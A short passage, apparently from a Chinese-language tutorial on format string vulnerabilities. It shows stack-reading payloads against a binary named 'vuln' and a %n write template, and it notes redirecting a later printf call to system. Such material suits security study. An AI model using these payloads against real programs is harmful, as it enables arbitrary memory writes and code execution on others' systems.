   ./vuln "%5$x"  (读取第5个参数位置的值)
   ./vuln "%10$s" (读取第10个位置作为字符串)

3. 任意地址写入（%n）:
   - %n: 写入已输出字符数到指定地址

   [地址][填充]%[输出宽度]x%[位置]$n

   - 下次调用 printf 时执行 system
```
